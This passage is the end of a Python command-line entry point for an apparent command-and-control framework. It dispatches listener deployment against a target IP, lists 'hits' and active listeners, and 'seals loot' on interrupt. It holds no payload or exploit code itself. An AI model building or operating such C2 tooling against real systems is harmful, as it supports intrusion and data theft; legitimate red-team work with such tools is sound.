        if a.query == "stopall":
            mgr.stop_all()
            print(json.dumps({"stopped": "all"}, indent=2)); return
        if a.query == "hits":
            print(json.dumps(mgr.get_hits(a.target), indent=2, default=str)); return
        if a.query == "active":
            print(json.dumps(mgr.get_active(), indent=2, default=str)); return
        # deploy: --target <ip> --query deploy
        listener = mgr.deploy(
            name=a.query or f"engagement-{int(time.time())}",
            target=a.target or "unknown",
            exploit_type=a.query or "unknown",
        )
        if listener:
            print(json.dumps(listener.status(), indent=2, default=str)); return
        print(json.dumps({"error": "deploy failed"}, indent=2)); return
    elif a.cmd == "listeners":
        from quantum.c2.listener import ListenerManager
        mgr = ListenerManager()
        print(json.dumps(mgr.list_all(), indent=2, default=str)); return


if __name__ == "__main__":
    try:
        main(sys.argv[1:])
    except KeyboardInterrupt:
        log("operator interrupt — sealing loot and exiting", "AUTO"); GRAYFISH.seal_dir()
    except SystemExit:
        raise
    except Exception as _fatal:
        import traceback
        from quantum.core.env import LOG_DIR
        log(f"FATAL: {_fatal}", "ERR")
        os.makedirs(LOG_DIR, exist_ok=True)
        with open(os.path.join(LOG_DIR, "crash.log"), "a") as f:
            f.write(f"--- {datetime.now().isoformat()} ---\n" + traceback.format_exc() + "\n")
        sys.exit(1)
